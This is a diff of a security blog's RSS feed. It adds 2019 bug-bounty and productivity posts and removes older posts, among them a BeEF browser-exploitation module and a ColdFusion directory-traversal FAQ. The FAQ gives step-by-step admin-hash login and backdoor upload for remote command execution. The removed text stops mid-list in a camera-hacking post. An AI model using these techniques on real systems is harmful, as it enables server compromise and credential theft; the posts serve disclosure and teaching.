@@ -1,4 +1,103 @@
-<?xml version="1.0" encoding="utf-8" ?><rss version="2.0" xml:base="https://www.gnucitizen.org" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom"><channel><atom:link href="https://www.gnucitizen.org/feed.xml" rel="self" type="application/rss+xml"></atom:link><title></title><description></description><link>https://www.gnucitizen.org/feed.xml</link><pubDate>Sat, 30 Jun 2018 09:49:53 GMT</pubDate><language>en</language><item><title>It has been a while</title><link>https://www.gnucitizen.org/blog/it-has-been-a-while/</link><pubDate>Sat, 30 Jun 2018 09:49:53 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/it-has-been-a-while/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
+<?xml version="1.0" encoding="utf-8" ?><rss version="2.0" xml:base="https://www.gnucitizen.org" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom"><channel><atom:link href="https://www.gnucitizen.org/feed.xml" rel="self" type="application/rss+xml"></atom:link><title></title><description></description><link>https://www.gnucitizen.org/feed.xml</link><pubDate>Fri, 16 Aug 2019 11:01:00 GMT</pubDate><language>en</language><item><title>10 Rules From Books</title><link>https://www.gnucitizen.org/blog/10-rules-from-books/</link><pubDate>Fri, 16 Aug 2019 11:01:00 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/10-rules-from-books/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
+<p>Here are 10 things I&#39;ve learned by reading books on various subject. I find this list tremendously useful and I promise I will provide the book titles at a later time. The reason I am sharing this is answered in point 2. Here we go:</p>
+<ol>
+<li><p>Achieve results by following a system. Do you want to get fit? Come up with a system that will make you fit. Do you want to write? Well, develop a system that creates time for you to write. It is easy to follow a system once it is in place.</p>
+</li>
+<li><p>Trying to be successful is the wrong way to look at life. Try to make yourself useful instead. Ask yourself the following questions: How can I be useful? How can I contribute? Success comes from being useful to others.</p>
+</li>
+<li><p>Speak less. Listen more. Ask questions to discover the base truths, first principles, and universal commonalities! Those that know how to listen effectively rule the world.</p>
+</li>
+<li><p>Don&#39;t obsess with your weaknesses. Concentrate on your strengths. You are not meant to be everything and I am sure there are a few things that you can do better than others. Being great in 2-3 things is better than being amazing in one specific thing.</p>
+</li>
+<li><p>Exercise humility. Everyone wants to be successful, respected and for their opinion to matter. Other people are just like you. Put yourself in their shoes.</p>
+</li>
+<li><p>Think progress! Never settle for the status quo. Improve everything you do.</p>
+</li>
+<li><p>You will never gain anything from arguments - not with your spouse, family, friends, colleagues and never on the Internet. There are other ways to win people over and at the same time make long-lasting relationships despite the differences in opinion.</p>
+</li>
+<li><p>If you cannot measure, you cannot manage. This is especially true for your time. Record where your time goes to understand how to manage it effectively. Time is a scarce resource always in deficit.</p>
+</li>
+<li><p>People are interested in other people. We are not concerned with the product of your work but by your method. In a true sense, we are most interested in how the sausage was made?</p>
+</li>
+<li><p>Copyright your faults. They are you.</p>
+</li>
+</ol>
+<p><a href="https://twitter.com/pdp/status/1162303395870531584?s=20">https://twitter.com/pdp/status/1162303395870531584?s=20</a></p>
+
+]]></description></item><item><title>BBH Scale</title><link>https://www.gnucitizen.org/blog/bbh-scale/</link><pubDate>Tue, 09 Jul 2019 16:38:00 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/bbh-scale/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
+<p>Here is a short tutorial on how to search when you do BBH. Now, you can do a lot of unix pipes and grep/ripgrep and so on but if you want to get a scale you might want to look into elasticsearch. #bugbountytips Here are a couple of commands to get you started:</p>
+<p>First, you need to convert your data to JSON. <code>jq</code> is your friend. The following command will curl a request and put it into a document: <code>C=$(curl -v https://secapps.com 2&gt;&amp;1) jq -n &#39;{contents: env.C}&#39;</code></p>
+<p>Sending a document to elasticsearch can be done like this: <code>curl -XPUT &#39;http://localhost:9200/curl/_doc/abc&#39; -d &#39;{}&#39;</code></p>
+<p>Stringing it all together should look like this:  <code>T=https://secapps.com D=abc C=$(curl -v &quot;$T&quot; 2&gt;&amp;1) jq -n &#39;{contents: env.C}&#39; | curl -XPUT &quot;http://localhost:9200/curl/_doc/$D&quot; -d &#39;@-&#39;</code></p>
+<p>In the previous tweet, you control the <code>T</code> and <code>D</code> variables. The rest is just doing the job. These variables are only available for that specific line. You don&#39;t need to export them beforehand. Bash is magic!</p>
+<p>Once you have your docs in elasticsearch you can search whichever way you want and with kebana, you can graph them too or set alerts ;) Now you can call yourself a data scientists.</p>
+<p>Spinup a $5 DO node and play around.</p>
+<p><a href="https://twitter.com/pdp/status/1148617500357222401">https://twitter.com/pdp/status/1148617500357222401</a></p>
+
+]]></description></item><item><title>Time And Money</title><link>https://www.gnucitizen.org/blog/time-and-money/</link><pubDate>Tue, 09 Jul 2019 14:45:00 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/time-and-money/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
+<p>Time is money only if the money you earn is multiple of the amount of time you spend working. Needless to say, this is not a great place to be. Ideas, timing, and execution is money.</p>
+<p><a href="https://twitter.com/pdp/status/1148588900639739904">https://twitter.com/pdp/status/1148588900639739904</a></p>
+
+]]></description></item><item><title>Writing Good Bug Bounty Reports</title><link>https://www.gnucitizen.org/blog/writing-good-bug-bounty-reports/</link><pubDate>Mon, 08 Jul 2019 21:18:00 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/writing-good-bug-bounty-reports/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
+<p>This is what I do to write successful bug bounty reports that payout. I used this technique on 3 hidden bug bounty programs. One of them gave me a 2K bounty. For the other two, I don&#39;t know. #bugbountytips</p>
+<ol>
+<li><p>Your introduction is like the first chapter of a book. This is your opportunity to show style and creativity. If this part of the report is weak the rest of the content is likely to be skimmed over.</p>
+</li>
+<li><p>Don&#39;t just slam some technical description and call it a day. Layout exactly how you found the vulnerability. It is like a good story. What tipped you to look in this direction? How long did it take you to get there? What obstacles you had to overcome and how you came on top against all odds?</p>
+</li>
+<li><p>Don&#39;t overstate the impact. I am guilty of this as well. Sometimes things are not as critical as they look but you could provide a measured assessment that will tip the scale your way. It is better to be truthful than annoying.</p>
+</li>
+<li><p>Rember that it is much easier to make a good first impression than to change the other person&#39;s mind. The later comes at personal cost. They have to admit they were wrong. You are not going to make friends this way.</p>
+</li>
+<li><p>Ask for feedback. I started doing this on my most recent reports. There is no other way to know what you did wrong and how you can improve.</p>
+</li>
+<li><p>Always provide value. This morning I reported an issue I was almost sure it will be a dup. The potential reward was 5 digits. I wrote them a nice bug report. It was a dup but my report still rocks.</p>
+</li>
+</ol>
+<p>My most recent reports are like chapters of a book (only 3 of them so far). When I wrote them I was thinking that perhaps one day I will bind them all and create an international bestseller.</p>
+<p>This is also time for self-reflection. You might learn a thing or two about your style or perhaps figure out if it is time to change strategy and direction.</p>
+<p>Remember that there are people on the other side of the computer screen. Communication is an essential skill.</p>
+<p>Btw, I messed up on almost all points above forgetting my years of training. The final report was the most important deliverable at the company where I and @dcuthbert used to work. We used to spend a lot of time to make sure everything was perfect before we hand over.</p>
+<p><a href="https://twitter.com/pdp/status/1148325597690703872">https://twitter.com/pdp/status/1148325597690703872</a></p>
+
+]]></description></item><item><title>Bug Bounty Tips</title><link>https://www.gnucitizen.org/blog/bug-bounty-tips/</link><pubDate>Sun, 07 Jul 2019 19:01:00 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/bug-bounty-tips/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
+<p>Perhaps the reason you are not finding vulns/bugs is either because your environment is not setup correctly or your methodology requires improvements. Here are a number of tips to help you with that #bugbountytips</p>
+<ol start="0">
+<li><p>Pivot between multiple exit nodes. Some services apply ACL rules so you will never be able to reach them from your home broadband. Use AWS C9 ;)</p>
+</li>
+<li><p>If you use separate profiles for Chrome you are doing it wrong. You will be wrestling the browser and the target application at the same time. Don&#39;t do this. Use <code>pown cdb launch -t</code> or <code>pown cdb launch -t -P auto</code> to launch chrome with a pentest-friendly configuration.</p>
+</li>
+<li><p>Don&#39;t stick to the scope. You need to have a bird-eye view to understand how things work. Don&#39;t hack but do take out of scope targets for consideration.</p>
+</li>
+<li><p>You will be as good as your tools. If all you do is Burp, ZAP and the likes you will find the same bugs as your peers. You need to understand that all tools have their own intricacies and you will miss things if you stick to one method only. Diversify!</p>
+</li>
+<li><p>Automate as much as you can. Sometimes you are lucky and you get a small window of an opportunity. I will let you know about one such bug once it gets triaged - but let&#39;s say that it appears I had only a window of a couple of hours to find it.</p>
+</li>
+<li><p>Either you do surface scans or deep dives. Don&#39;t do both at the same time. You will get lost and you will miss things. I&#39;ve done this mistake myself many times.</p>
+</li>
+<li><p>Read old reports. The older they are the better. Everyone is looking at the most recent hactivity reports and will follow the same trails. Some of the coolest research you will hear about at BH this year is based on papers written in 2006.</p>
+</li>
+<li><p>Have a methodology. When I was pentesting for a boutique consultancy company in London I learned to use a well-developed methodology which I initially hated. I still consider it one of the best methodologies I have ever encountered. Develop your own.</p>
+</li>
+<li><p>Take your time. Tomorrow you will have better ideas. It hurts when you don&#39;t find anything but this is part of the creative process. I don&#39;t call it a failure, I call it iteration.</p>
+</li>
+<li><p>Don&#39;t obsess about making the perfect system. Far too many people, including myself, try to make the perfect recon or the perfect automated scanning infrastructure, etc. If other people have built it, capitalize on their work. Solve the unsolved problems.</p>
+</li>
+</ol>
+<p>This is what I have on the top of my head. I hope it helps.</p>
+<p><a href="https://twitter.com/pdp/status/1147928550307258368">https://twitter.com/pdp/status/1147928550307258368</a></p>
+
+]]></description></item><item><title>Jobs Of Tomorrow</title><link>https://www.gnucitizen.org/blog/jobs-of-tomorrow/</link><pubDate>Thu, 16 May 2019 08:50:00 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/jobs-of-tomorrow/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
+<p>Keep in mind that your kids will do jobs that don’t yet exist. When I was a child the cyber security field did not exist - not in the same capacity as it did when I started my professional career. What are the niche fields that will drive future innovation?</p>
+<p>Different sub-disciplines of AI and machine learning for sure including sub-branches of law, psychology, ethics and security.</p>
+<p>Space travel - we are doing it today and we will continue doing it even more in the future.</p>
+<p>Robotics - mostly design I imagine. You could be a robotics designer much like car designers these days.</p>
+<p>Smart wearable clothing - a new world of possibilities will open when you convert atoms to bits which will require rethinking the whole industry from the ground up.</p>
+<p>New types of entertainment - Netflix is already experimenting successfully with interactive content - as AR and VR get adopted will see more of it I am sure. This will require merging gaming with cinematography. It is already happening.</p>
+<p>Bioengineering and nano-engineering!</p>
+<p><a href="https://twitter.com/pdp/status/1128930582900150273">https://twitter.com/pdp/status/1128930582900150273</a></p>
+
+]]></description></item><item><title>It has been a while</title><link>https://www.gnucitizen.org/blog/it-has-been-a-while/</link><pubDate>Sat, 30 Jun 2018 09:49:53 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/it-has-been-a-while/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
 <p>GNUCITIZEN is 12 years old more or less. Can you believe it?</p>
 <p>I am still trying to process the information and while it saddens me a little that we left the blogging scene for the past 8+ years I am proud with what we have achieved and the kind of legacy we have created. Even after so many successes and countless more failures, it is interesting to trace GC&#39;s impact on the security community over the years - from being first to try out different vulnerability disclosure practices to popping calc.exe from PDF documents or hacking hubs - it has more or less started here and took a life on its own.</p>
 <p>It is almost surreal watching our old videos and even sometimes it is a bit embarrassing reading some of our old research, blog posts, and the good old comment flame wars. But this is normal. As you grow older and learn more you also become aware of your personal limitations. The naivety of the younger you are long gone and what is left is the hardened shell fortified by years of experience.</p>
@@ -70,177 +169,5 @@ For commercial options please contact us at http://www.gnucitizen.org/.
 </blockquote>
 <p>If you have any suggestions, recommendations or general feedback please do let us know. You can also <a href="https://spreadsheets.google.com/spreadsheet/viewform?formkey=dEFlRENtdnJKSTJaeC13TjhHaVduckE6MQ">participate</a> in the beta test program which will allow you to have a play with tool as we are polishing it for the official release.</p>
 <p><em>The possibilities are endless.</em></p>
-
-]]></description></item><item><title>Stuxnet</title><link>https://www.gnucitizen.org/blog/stuxnet/</link><pubDate>Mon, 13 Jun 2011 15:21:37 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/stuxnet/</guid><dc:creator>pdp</dc:creator><description><![CDATA[
-<p>I have been avoiding the topic about Stuxnet for quite some time, mainly because there were many others who spent the time to take the virus apart. However, here is a video, which I find rather amusing:</p>
-<iframe class="video" src="//www.youtube.com/embed/7g0pi4J8auQ" frameborder="0" allowfullscreen></iframe>
-
-<p>Wether this is the real deal or simply fear mongering, I simply don&#39;t know. It is all speculations at the moment. The only thing we can say is that it is difficult to deny the fact that computers are important and whoever has control over them has control over people lives and can influence a lot of things including politics.</p>
-
-]]></description></item><item><title>Having Fun With BeEF, The Browser Exploitation Framework</title><link>https://www.gnucitizen.org/blog/having-fun-with-beef-the-browser-exploitation-framework/</link><pubDate>Tue, 22 Feb 2011 11:40:26 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/having-fun-with-beef-the-browser-exploitation-framework/</guid><dc:creator>pagvac</dc:creator><description><![CDATA[
-<blockquote>
-<p>We haven&#39;t featured any guest bloggers in a while, but we&#39;re glad to be featuring <a href="http://un-excogitate.org/">Chirstian Frichot</a> this month! Christian is a security professional based in Perth, Western Australia. He&#39;s currently working in the finance industry as part of a tight-knit internal team of security consultants doing their best to protect their business and customers from technical threats such as malware or insecure web applications.</p>
-</blockquote>
-<blockquote>
-<p>After having met <a href="http://www.bindshell.net/users/Wade">Wade Alcorn</a> (the initial author and project lead of BeEF), Christian mentioned his interest in helping out on the project where he could, which eventually led to Wade accepting his offer. The discussion was held over a couple of bottles of wine, so perhaps Wade&#39;s regretting the decision now!</p>
-</blockquote>
-<blockquote>
-<p>Christian&#39;s role within the BeEF project, if it were to be defined, is odd-jobs-go-to-boy, command-module implementer, Ext-JS-fighter and twitter maintainer. When Christian is not working on BeEF, he&#39;s doing his best to represent the Perth OWASP Chapter, or laying down crunchy beats on the drum-kit.</p>
-</blockquote>
-<blockquote>
-<p>What follows are Chritian&#39;s words on the BeEF project.</p>
-</blockquote>
-<p>Sorry vegetarians, but BeEF is back. That&#39;s right, the Browser Exploitation Framework is back, and it has now been rewritten from the ground up in Ruby. For those unfortunate people who haven&#39;t had a chance to explore the older, PHP version of BeEF you&#39;re only missing out on one of the greatest, most extensible XSS-payload management and exploitation frameworks out there, and the Ruby re-write is no different.</p>
-<p>The Browser Exploitation Framework (BeEF) is a powerful, professional security tool. BeEF is pioneering techniques that provide the experienced penetration tester with practical client side attack vectors. Unlike other security frameworks, BeEF focuses on leveraging browser vulnerabilities to assess the security posture of a target.</p>
-<p>One of the newer modules implemented in BeEF utilises the insecure handling of URL schemes in Apple&#39;s iOS to trick Skype into starting an outbound call. This vulnerability was first written about by <a href="http://www.dhanjani.com/blog/2010/11/insecure-handling-of-url-schemes-in-apples-ios.html">Nitesh Dhanjani</a> and highlights that with the growing popularity of these devices these sorts of issues may lead to losses of information or other negative impacting events. The module itself is as simple as:</p>
-<pre><code class="language-javascript">beef.execute(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>{
-    <span class="built_in">document</span>.body.innerHTML = <span class="string">"&lt;iframe src=skype:&lt;%= @tel_num %&gt;?call&gt;&lt;/iframe&gt;"</span>;
-    beef.net.sendback(<span class="string">"&lt;%= @command_url %&gt;"</span>, &lt;%= @command_id %&gt;, <span class="string">"result=IFrame Created!"</span>);
-});</code></pre>
-<p>which, once added to a particular hooked browsers command queue will simply execute upon next poll, and if they automatically authenticate to the Skype application, will initiate a call. Due to iOS&#39; multi-tasking the Skype app does pop up to the top, so the end user is aware that the activity is occurring, but they&#39;re not prompted to &quot;confirm&quot; the action. You can see this module demonstrated bellow:</p>
-<iframe class="video" src="//www.youtube.com/embed/5SVu6VdLWgs" frameborder="0" allowfullscreen></iframe>
-
-<p>The current release is 0.4.2.1-alpha, but by release 0.5 (the Sirloin Release) we&#39;re expecting to have at least all of the PHP BeEF functionality provided plus much more, including:</p>
-<ol>
-<li>jQuery included as part of the hooking process</li>
-<li>Metasploit integration</li>
-<li>Evercookie&#39;s for persistence even after a hooked browser has been closed</li>
-<li>Full event logging, not just keystroke logging, to include window activation/deactivation, mouse clicks, etc</li>
-<li>Arbitrary HTTP requester</li>
-<li>Proxying</li>
-<li>Persistence modules (subtle popups or 100%x100% iframes)</li>
-<li>Detecting of social networking authentication status (as per <a href="http://grepular.com/Abusing_HTTP_Status_Codes_to_Expose_Private_Information">this</a>)</li>
-</ol>
-<p>You can find out more about beef over at <a href="http://beef.googlecode.com">http://beef.googlecode.com</a> or
-by following the <a href="http://twitter.com/beefproject">@beefproject</a>.</p>
-<p><em>BeEF - Get it into ya!</em></p>
-
-]]></description></item><item><title>ColdFusion directory traversal FAQ (CVE-2010-2861)</title><link>https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/</link><pubDate>Fri, 13 Aug 2010 15:31:33 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/</guid><media:content url="https://www.gnucitizen.org/files/2010/08/cf_dir_traversal_exploited-270x150.png &quot;CF Dir Traversal Exploited PNG&quot;"></media:content><dc:creator>pagvac</dc:creator><description><![CDATA[
-<p>A new Adobe <a href="http://www.adobe.com/support/security/bulletins/apsb10-18.html">hotfix</a> for ColdFusion has been released recently. The vulnerability which was discovered by Richard Brain, was rated as <a href="http://www.adobe.com/devnet/security/security_zone/severity_ratings.html">important</a> by Adobe and could affect a large number of Internet-facing web servers. The FAQ bellow is meant to shed some light on this vulnerability so that ColdFusion administrators can understand what they&#39;re up against.</p>
-<h3 id="the-faq">The FAQ</h3>
-<p>Finally, by producing this FAQ I will attempt to explain why (at least on certain setups) this vulnerability should have been granted a <strong>CRITICAL</strong> rating by Adobe, rather than Important. As we&#39;ll see bellow, it is possible to fully compromise the underlying OS of a vulnerable ColdFusion server by exploiting this directory traversal vulnerability.</p>
-<h4 id="how-does-the-vulnerability-work-">How does the vulnerability work?</h4>
-<p>The vulnerability is a variation of a classic directory traversal vulnerability, also referred to as arbitrary file retrieval. The attack involves tricking a server-side script to provide the contents of a file that it was not originally supposed to be made available. By moving up a few directory levels, the attacker is able to obtain the contents of files outside the application server&#39;s webroot via special strings such as <code>../</code>. More information can be found on the <a href="http://www.owasp.org/index.php/Path_Traversal">OWASP</a> website.</p>
-<h4 id="is-authentication-required-to-exploit-this-vulnerability-">Is authentication required to exploit this vulnerability?</h4>
-<p>NO. The attacker doesn&#39;t require knowledge of any passwords in order to exploit the directory traversal bug.</p>
-<h4 id="what-s-the-goal-of-the-attacker-when-exploiting-this-vulnerability-">What&#39;s the goal of the attacker when exploiting this vulnerability?</h4>
-<p>Just as any other type of directory traversal vulnerability, the attacker would usually attempt to obtain source code of the target site in order to identify security vulneraibilities. Additionally, the attacker would most likely attempt to obtain configuration files containing sensitive information. For instance, in the case of ColdFusion the attacker would most likely attempt to read the contents of <code>neo-security.xml</code> and <code>password.properties</code>. These configuration files contain database connection credentials and the ColdFusion administrator password respectively. Depending on how <code>password.properties</code> has been setup, the ColdFusion admin password will be hashed or stored in clear-text (<code>encrypted=false</code>).</p>
-<h4 id="what-s-the-worst-that-could-happen-once-this-vulnerability-has-been-exploited-successfully-">What&#39;s the worst that could happen once this vulnerability has been exploited successfully?</h4>
-<p>As we&#39;ll see at the end of this post, once the attacker has gained access to the CF admin console - e.g.: by cracking the admin password - it might be possible to fully compromise the underlying OS.</p>
-<h4 id="how-can-the-vulnerability-be-resolved-">How can the vulnerability be resolved?</h4>
-<p>You can either apply Adobe&#39;s <a href="http://kb2.adobe.com/cps/857/cpsid_85766.html">patch</a> or restrict access to the following directories and file from trusted IP addresses only: <code>/CFIDE/adminapi/ /CFIDE/administrator/ /CFIDE/componentutils/ /CFIDE/wizards/ /CFIDE/install.cfm</code></p>
-<h4 id="what-are-the-mitigating-factors-">What are the mitigating factors?</h4>
-<p>This vulnerability cannot be exploited on ColdFusion 9.X when default settings are used, unless of course you figure out a way to get around the directory traversal signatures used by the filtering routines. Additionally, the ColdFusion administrator login console must be available to the attacker. It is however quite common to find CF admin consoles directly available on the Internet.</p>
-<p><del datetime="2010-08-16T22:36:05+00:00">If a long and sufficiently random admin password is used, cracking the SHA1 hash could prove to be difficult. This is applicable to CF MX7, 8 and 9</del> (<strong>see UPDATE notes</strong>). Version 6 doesn&#39;t hash the password, but instead encrypts it using a proprietary algorithm.</p>
-<h4 id="what-versions-of-coldfusion-are-affected-">What versions of ColdFusion are affected?</h4>
-<p>According to the Adobe <a href="http://www.adobe.com/support/security/bulletins/apsb10-18.html">bulletin</a> the affected versions are &quot;ColdFusion 8.0, 8.0.1, 9.0, 9.0.1 and earlier versions for Windows, Macintosh and UNIX&quot;. However, due to time constraints I have only personally confirmed the vulnerability on version 8.0.1 under Windows.</p>
-<h4 id="can-you-provide-the-actual-exploit-">Can you provide the actual exploit?</h4>
-<p>No. ProCheckUp will provide the exploit details at a later date. Although Richard Brain privately shared POC URLs with me, I will not make them available. Exploit details were only provided to me as a trusted security analyst for purpose of assessing the impact of the vulnerability and help me write this FAQ in the hope that it will benefit the community.</p>
-<p><strong>UPDATE:</strong> the <a href="http://www.exploit-db.com/exploits/14641/">exploit details</a> were published by an anonymous researcher on <em>14/08/2010_, probably worked out by reverse-engineering Adobe&#39;s patches. ProCheckUp has also released the <a href="http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-07">exploit details</a> as of _17/08/2010</em>.</p>
-<h4 id="can-you-describe-a-real-attack-scenario-">Can you describe a real attack scenario?</h4>
-<p>The following a real attack scenario against ColdFusion 8 on a Windows server:</p>
-<ol>
-<li>Attacker confirms ColdFusion admin console is Internet facing. E.g. <code>http://target-domain.foo/CFIDE/administrator/index.cfm</code></li>
-<li>Attacker exploits directory traversal vulnerability and obtains the contents of <code>C:\ColdFusion8\lib\password.properties</code>, which contains the ColdFusion admin password <div class="screen"><a href="/files/2010/08/cf_dir_traversal_exploited.png"><img src="/files/2010/08/cf_dir_traversal_exploited-270x150.png" alt="" title="CF Dir Traversal Exploited PNG"></a></div></li>
-<li>If the admin password was stored encrypted (actually CF8 hashes the admin password using the SHA1 algorithm, similar to CF MX7), the attacker then attempts to crack it via an offline password cracking attack or <a href="http://passcracking.com/">rainbow table</a> <a href="http://hashcrack.com/">lookup</a>. Note that the default setting in ColdFusion 8 is <code>encrypted=true</code> as per <code>password.properties</code> file. Otherwise, if the password is stored unencrypted (<code>encrypted=false</code>), there would be no need for password cracking.</li>
-<li><strong>UPDATE:</strong> as suggested by <a href="http://blog.teusink.net/">Niels Teusink</a>, an attacker could login as the CF administrator without needing to crack the SHA1 hash. I verified his observation and can confirm it works well. You can follow these steps (tested on Firefox 3.6.8) to login using the SHA1 hash. i.e.: no need to crack the password hash:<pre><code>1.  Configure your favorite MITM proxy - e.g. [Burp](http://portswigger.net/proxy/) - to capture traffic between your browser and target CF admin console</code></pre><ol start="2">
-<li>Enter hash in password field of login form (usually located on <code>/CFIDE/administrator/enter.cfm</code>)</li>
-<li>Type the following on your browser&#39;s address bar and press enter (make sure JavaScript is enabled on your browser): <code>javascript:hex_hmac_sha1(document.loginform.salt.value,document.loginform.cfadminPassword.value)</code></li>
-<li>Record value. e.g. <code>AFA9C9D917916DE6CE05C1BFEC0470E07A246CB0</code></li>
-<li>Press browser&#39;s Back button</li>
-<li>Press Login on the login form (trapping/intercept mode should be enabled on your MITM proxy at this point)</li>
-<li>Trap the login request and replace the value of the <code>cfadminPassword</code> parameter with the value recorded above</li>
-<li>Forward request</li>
-</ol>
-</li>
-<li>At this point, the attacker would be able to login as a CF admin and upload a <a href="http://michaeldaw.org/projects/web-backdoor-compilation">malicious CFM script</a> that would allow him to run remote commands (SYSTEM privileges by default). Uploading files to a CF server via the administrator console is a bit counter-intuitive. The attacker would basically add a scheduled task that would download cfexec.cfm to the server&#39;s webroot <div class="screen"><a href="/files/2010/08/backdoor_task.png"><img src="/files/2010/08/backdoor_task-170x150.png" alt="" title="CF Backdoor Task PNG"></a></div></li>
-<li>At this point, the attacker has gained full control of the underlying Windows OS as the CF service runs with SYSTEM privileges by default <div class="screen"><a href="/files/2010/08/command_execution2.png"><img src="/files/2010/08/command_execution2-362x150.png" alt="" title="CF Command Execution PNG"></a> <a href="/files/2010/08/command_output.png"><img src="/files/2010/08/command_output-300x90.png" alt="" title="CF Command Output PNG"></a></div></a></li>
-</ol>
-<p>If the CF admin password is hashed and the attacker is unable to crack it, he could always try to obtain the database connection credentials (<code>C:\ColdFusion8\lib\neo-datasource.xml</code>) which can be <a href="http://hexale.blogspot.com/2008/07/how-to-decrypt-coldfusion-datasource.html">easily decrypted</a> and then directly authenticate to the backend DB server. This however wouldn&#39;t normally be possible on a firewalled environment where the back-end DB server is not directly exposed to the Internet. Network access controls are your friends!</p>
-<h3 id="post-updates">Post Updates</h3>
-<ul>
-<li><strong>16/09/2010</strong> - new path added as part of blacklisting solution</li>
-<li><strong>16/09/2010</strong> - added trick to login without cracking the CF admin password hash</li>
-<li><strong>16/09/2010</strong> - mentioned recently published exploit code for the CF traversal vulnerability</li>
-<li><strong>18/09/2010</strong> - fixed typos and mentioned release of exploit details by ProCheckUp</li>
-</ul>
-
-]]></description></item><item><title>1ST European Edition of HITB Coming Up!</title><link>https://www.gnucitizen.org/blog/1st-european-edition-of-hitb-coming-up/</link><pubDate>Thu, 24 Jun 2010 09:16:22 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/1st-european-edition-of-hitb-coming-up/</guid><dc:creator>pagvac</dc:creator><description><![CDATA[
-<p>In case you haven&#39;t heard yet, HITBSecConf is hosting the first European Edition of their <a href="http://conference.hackinthebox.org/hitbsecconf2010ams/?page_id=24">conference</a> in Amsterdam during 1st-2nd July &#39;10. The history of the HITB conferences can be traced back to 2002, the year in which the first ever edition of HITB took place in Malaysia. Since then, HITB has grown to become the biggest technical computer security event in Asia and has extended their presence to the Middle East and now Europe.</p>
-<blockquote>
-<p>HITB aims to congregate members of the security community from all circles. From academics, and well known infosec personalities to loner-type independent researchers, and hobbyists just to name a few. I&#39;ve personally attended past editions in Kuala Lumpur and Dubai and loved that the attendees and speakers came from a wide variety of backgrounds. If you don&#39;t believe me, check out the <a href="http://photos.hackinthebox.org/gallery/">pix</a> of past conferences and you&#39;ll find sec nerds and corporate professionals all partying in unison. Indeed, the HITB conferences are not only educational, but among the most fun sec events I&#39;ve had the chance to attend.</p>
-</blockquote>
-<p>Registration is still open, so you are still on time to take advantage of a great speaker lineup and one of the <em>de facto</em> party capitals of Europe. The conference agenda can be found <a href="http://conference.hitb.org/hitbsecconf2010ams/agenda.pdf">here</a>.  I&#39;m really looking forward to Niels Teusink&#39;s <a href="http://blog.teusink.net/2010/05/presenting-at-hack-in-box-2010.html">presentation</a> on hacking Logitech wireless presenters and the release of detailed examples of JIT-spray techniques against IE8, FF3.6 by <a href="http://dsecrg.com/">Alexey Sintsov</a> (originally <a href="http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Slides-v2.pdf">discussed</a> by Dion Blazakis).</p>
-<p>One more thing, almost forgot: there will be a bring-your-own-laptop <a href="http://conference.hitb.org/hitbsecconf2010ams/?page_id=41">web hacking challenge</a> at HITB EU.</p>
-<p><em>See you at HITB Amsterdam next month!</em></p>
-
-]]></description></item><item><title>Hacking Linksys IP Cameras (pt 6)</title><link>https://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-6/</link><pubDate>Wed, 24 Feb 2010 07:18:29 GMT</pubDate><guid isPermaLink="true">https://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-6/</guid><dc:creator>pagvac</dc:creator><description><![CDATA[
-<blockquote>
-<p>This article is a continuation of the following GNUCITIZEN articles: <a href="/blog/hacking-linksys-ip-cameras-pt-1/">here</a>, <a href="/blog/hacking-linksys-ip-cameras-pt-2/">here</a>, <a href="/blog/hacking-linksys-ip-cameras-pt-3/">here</a>, <a href="/blog/hacking-linksys-ip-cameras-pt-4/">here</a> and <a href="/blog/hacking-linksys-ip-cameras-pt-5/">here</a>.</p>
-</blockquote>
-<p>As we know, there are several ways one could go about hunting for IP cameras on the net. The slowest way would be to portscan random IP addresses for certain ports and programmatically detect if the web interface of a given camera was available on the open ports found. This method definitely works, but it can be very time consuming as it consists of scanning random IP addresses hoping that we&#39;ll eventually come across the type of device we&#39;re interested in.</p>
-<p>The second method, which would be much faster in finding our target devices, would be to use a <a href="http://www.google.co.uk/search?ie=UTF-8&amp;q=inurl:/img/vr.htm">search engine</a> and query content that is unique to our target devices (e.g.: URLs, HTML title). This method, popularized by <a href="http://www.hackersforcharity.org/ghdb/?function=summary&amp;cat=18">GHDB</a> is simple and effective. The only issue I find with this strategy is that many of these IP cameras found happen to respond very slowly. This is probably due to other curious individuals running the same searches and accessing the same cameras.</p>
-<p>The third method which would allow you to find more hidden Linksys IP cameras (i.e.: not cached by search engines a.k.a. the <a href="http://www.ericdigests.org/2002-2/hidden.htm">hidden web</a>), would consist of bruteforcing subdomains within dynamic domain names (DDNS) used by our target devices (Linksys IP cameras in this case). For instance, the following are some of the dynamic domain names supported by the WVC54GCA and WVC80N Linksys IP camera models:</p>
-<ul>
